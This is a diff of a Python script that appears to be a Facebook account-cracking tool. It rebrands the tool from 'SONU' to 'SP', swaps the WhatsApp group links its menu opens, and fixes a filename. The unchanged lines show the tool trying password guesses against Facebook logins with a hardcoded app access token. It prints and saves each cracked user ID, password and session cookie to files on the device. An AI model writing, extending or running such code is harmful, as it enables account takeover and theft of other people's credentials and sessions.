@@ -53,7 +53,7 @@ filter = []
 loop,ok,cp,user = 0,[],[],[]
 cok,plist = [],[]
 #__________________[ SYS ]__________________#
-sys.stdout.write('\x1b]2; SONU\x07')
+sys.stdout.write('\x1b]2; PRASHANT\x07')
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 #__________________[ COLOUR ]__________________#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
@@ -70,7 +70,7 @@ G3 = '\x1b[38;5;48m'
 def clear():os.system('clear');print(logo)
 def linex():print(f'{A}──────────────────────────────────────────────────')
 #__________________[ LOGO ]__________________#
-logo =f"""\x1b[1;97m
+logo =f"""\x1b[1;97m   
 \033[1;33m   
   /$$$$$$           
  /$$__  $$          
@@ -107,15 +107,15 @@ def menu():
     select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
     if select =='1':
         _file_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
+        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
     elif select =='2':
         _randm_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
+        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
     elif select =='3':
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
+        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
         menu()
     elif select =='0':
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
+        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
         exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
     else:
         print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
@@ -131,7 +131,7 @@ def _randm_():
     select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
     if select =='1':
         _bd_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
+        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
     elif select =='2':
         _India_()
     elif select =='0':
@@ -365,7 +365,7 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
                     print(f'\r\r{G1}[COOKIE]{A} {ckkk}')
-                    open('/sdcard/SP'M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
+                    open('/sdcard/SP-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
@@ -416,7 +416,7 @@ class main_crack():
 #__________________[ RANDOM METHOD ]__________________#
 def randm(ids,psd):
     global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}SONU{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
+    sys.stdout.write(f"\r{G1}[{A}SP{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
     sys.stdout.flush()
     access_token = f'2560'+'02347743'+'983|374e'+'60f8b9bb'+'6b8cbb30f7'+'8030438895'
     try:
@@ -465,9 +465,9 @@ def randm(ids,psd):
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[SONU-OK] {uid} | {pas}')
+                print(f'\r\r{G1}[SP-OK] {uid} | {pas}')
                 print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/SONU-R-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/SP-R-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
                 break
             else:continue
